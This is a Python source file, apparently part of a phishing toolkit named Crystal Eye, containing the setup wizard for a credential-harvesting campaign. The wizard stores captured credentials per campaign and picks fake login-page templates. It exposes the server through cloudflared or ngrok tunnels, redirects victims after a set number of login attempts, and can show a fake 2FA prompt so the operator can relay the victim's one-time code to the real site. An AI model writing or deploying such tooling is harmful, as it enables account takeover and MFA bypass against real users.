from __future__ import annotations

import re
from typing import TYPE_CHECKING

from rich.console import Console
from rich.panel import Panel
from rich.prompt import Confirm, IntPrompt, Prompt

from crystal_eye.config import CrystalEyeConfig
from crystal_eye.server.tls import generate_self_signed_cert
from crystal_eye.templates.registry import TemplateRegistry

if TYPE_CHECKING:
    from crystal_eye.repl.shell import CrystalEyeShell


class SetupWizard:
    """Interactive setup wizard for configuring Crystal Eye."""

    def __init__(
        self,
        config: CrystalEyeConfig,
        shell: CrystalEyeShell,
        console: Console,
        template_registry: TemplateRegistry,
    ) -> None:
        self.config = config
        self.shell = shell
        self.console = console
        self.registry = template_registry

    def run(self) -> bool:
        """Run all wizard steps. Returns True if user wants to start the server."""
        self.console.print()
        self.console.print(Panel("[bold]Setup Wizard[/bold]", border_style="cyan"))
        self.console.print()

        self._step_campaign()
        self._step_template()
        self._step_server()
        self._step_tunnel()
        if not self.config.tunnel:
            self._step_https()
        self._step_behavior()
        self._step_2fa()
        return self._step_summary()

    def _step_campaign(self) -> None:
        self.console.print("[bold cyan]Step 1:[/bold cyan] Campaign Name")
        self.console.print("[dim]All data (credentials, certs, exports) will be stored per campaign.[/dim]")

        while True:
            name = Prompt.ask("  Campaign name", console=self.console, default=self.config.campaign)
            if not name or not re.match(r"^[a-zA-Z0-9_-]+$", name):
                self.console.print("[red]  Name must be alphanumeric (hyphens/underscores allowed).[/red]")
                continue

            self.config.campaign = name
            # Initialize campaign DB
            self.shell.init_campaign_db()

            from crystal_eye.db.repository import CampaignRepository

            campaign_repo = CampaignRepository(self.shell.db)
            existing = campaign_repo.get_by_name(name)
            if existing:
                resume = Confirm.ask(
                    f"  Campaign '{name}' exists. Resume it?",
                    console=self.console,
                    default=True,
                )
                if not resume:
                    continue

            self.console.print(f"  [dim]Campaign dir: {self.config.campaign_dir}[/dim]")
            break

        self.console.print()

    def _step_template(self) -> None:
        self.console.print("[bold cyan]Step 2:[/bold cyan] Template Selection")

        templates = self.registry.list_all()
        if not templates:
            self.console.print("[red]  No templates found! Add templates to the templates/ directory.[/red]")
            return

        for i, t in enumerate(templates, 1):
            desc = f" - {t.description}" if t.description else ""
            self.console.print(f"  [bold]{i}.[/bold] {t.display_name}{desc}")

        self.console.print()
        choice = IntPrompt.ask(
            "  Select template",
            console=self.console,
            default=1,
        )
        choice = max(1, min(choice, len(templates)))
        selected = templates[choice - 1]
        self.config.template = selected.name
        self.console.print(f"  [green]Selected:[/green] {selected.display_name}")
        self.console.print()

    def _step_server(self) -> None:
        self.console.print("[bold cyan]Step 3:[/bold cyan] Server Configuration")

        while True:
            port_str = Prompt.ask(
                "  Port",
                console=self.console,
                default=str(self.config.port),
            )
            try:
                port = int(port_str)
                if 1 <= port <= 65535:
                    self.config.port = port
                    break
                self.console.print("[red]  Port must be 1-65535.[/red]")
            except ValueError:
                self.console.print("[red]  Invalid port number.[/red]")

        self.console.print()

    def _step_tunnel(self) -> None:
        self.console.print("[bold cyan]Step 4:[/bold cyan] Tunnel")
        self.console.print(
            "[dim]Expose your server to the internet via cloudflared or ngrok.\n"
            "  Both handle HTTPS automatically.[/dim]"
        )

        use_tunnel = Confirm.ask(
            "  Use a tunnel?",
            console=self.console,
            default=self.config.tunnel is not None,
        )

        if use_tunnel:
            provider = Prompt.ask(
                "  Provider",
                console=self.console,
                choices=["cloudflared", "ngrok"],
                default=self.config.tunnel or "cloudflared",
            )
            self.config.tunnel = provider

            # Tunnel handles TLS — disable local HTTPS
            self.config.use_https = False

            if provider == "cloudflared":
                from crystal_eye.tunnel.cloudflared import CloudflaredTunnel

                tunnel = CloudflaredTunnel()
                if not tunnel.is_installed():
                    self.console.print(
                        "  [yellow]cloudflared not found on PATH.[/yellow]\n"
                        "  [dim]Install: sudo pacman -S cloudflared (Arch) | brew install cloudflare/cloudflare/cloudflared (macOS)[/dim]"
                    )
                else:
                    self.console.print(f"  [green]{provider} found.[/green]")
            else:
                self.console.print(f"  [green]{provider} ready (managed by pyngrok).[/green]")
        else:
            self.config.tunnel = None

        self.console.print()

    def _step_https(self) -> None:
        self.console.print("[bold cyan]Step 5:[/bold cyan] HTTPS Configuration")

        use_https = Confirm.ask(
            "  Enable HTTPS?",
            console=self.console,
            default=self.config.use_https,
        )
        self.config.use_https = use_https

        if use_https:
            campaign_dir = self.config.campaign_dir
            cert_path = campaign_dir / "cert.pem"
            key_path = campaign_dir / "key.pem"

            if cert_path.exists() and key_path.exists():
                reuse = Confirm.ask(
                    "  Existing certificate found. Reuse it?",
                    console=self.console,
                    default=True,
                )
                if reuse:
                    self.config.cert_path = str(cert_path)
                    self.config.key_path = str(key_path)
                    self.console.print("  [green]Using existing certificate.[/green]")
                    self.console.print()
                    return

            generate = Confirm.ask(
                "  Generate self-signed certificate?",
                console=self.console,
                default=True,
            )
            if generate:
                generate_self_signed_cert(cert_path, key_path)
                self.config.cert_path = str(cert_path)
                self.config.key_path = str(key_path)
                self.console.print("  [green]Certificate generated:[/green]")
                self.console.print(f"    cert: {cert_path}")
                self.console.print(f"    key:  {key_path}")
            else:
                cert = Prompt.ask("  Path to certificate file", console=self.console)
                key = Prompt.ask("  Path to key file", console=self.console)
                self.config.cert_path = cert
                self.config.key_path = key

        self.console.print()

    def _step_behavior(self) -> None:
        self.console.print("[bold cyan]Step 6:[/bold cyan] Behavior Settings")

        manifest = self.registry.get(self.config.template)
        default_attempts = manifest.max_attempts if manifest else 2
        default_redirect = manifest.redirect_url if manifest else ""

        attempts = IntPrompt.ask(
            "  Max login attempts before redirect",
            console=self.console,
            default=default_attempts,
        )
        self.config.max_attempts = attempts

        redirect = Prompt.ask(
            "  Redirect URL",
            console=self.console,
            default=default_redirect,
        )
        self.config.redirect_url = redirect

        self.console.print()

    def _step_2fa(self) -> None:
        self.console.print("[bold cyan]Step 7:[/bold cyan] 2FA Capture")
        self.console.print(
            "[dim]After capturing credentials, show a fake 2FA code prompt.\n"
            "  You log into the real site to trigger the code, then capture it here.[/dim]"
        )

        enable = Confirm.ask(
            "  Enable 2FA capture?",
            console=self.console,
            default=self.config.enable_2fa,
        )
        self.config.enable_2fa = enable
        if enable:
            self.console.print("  [green]2FA capture enabled.[/green]")
        self.console.print()

    def _step_summary(self) -> bool:
        self.console.print("[bold cyan]Summary[/bold cyan]")
        self.console.print()

        protocol = "https" if self.config.use_https else "http"
        lines = [
            f"  [bold]Campaign:[/bold]     {self.config.campaign}",
            f"  [bold]Template:[/bold]     {self.config.template}",
            f"  [bold]Server:[/bold]       {protocol}://{self.config.host}:{self.config.port}",
            f"  [bold]Tunnel:[/bold]       {self.config.tunnel or 'none'}",
            f"  [bold]HTTPS:[/bold]        {'Yes' if self.config.use_https else 'No'}",
            f"  [bold]Max Attempts:[/bold] {self.config.max_attempts}",
            f"  [bold]Redirect:[/bold]     {self.config.redirect_url}",
            f"  [bold]2FA Capture:[/bold]  {'Yes' if self.config.enable_2fa else 'No'}",
            f"  [bold]Data dir:[/bold]     {self.config.campaign_dir}",
        ]
        self.console.print(Panel("\n".join(lines), border_style="green", title="[bold]Configuration[/bold]"))
        self.console.print()

        self.config.save()
        return Confirm.ask(
            "  Start server now?",
            console=self.console,
            default=True,
        )
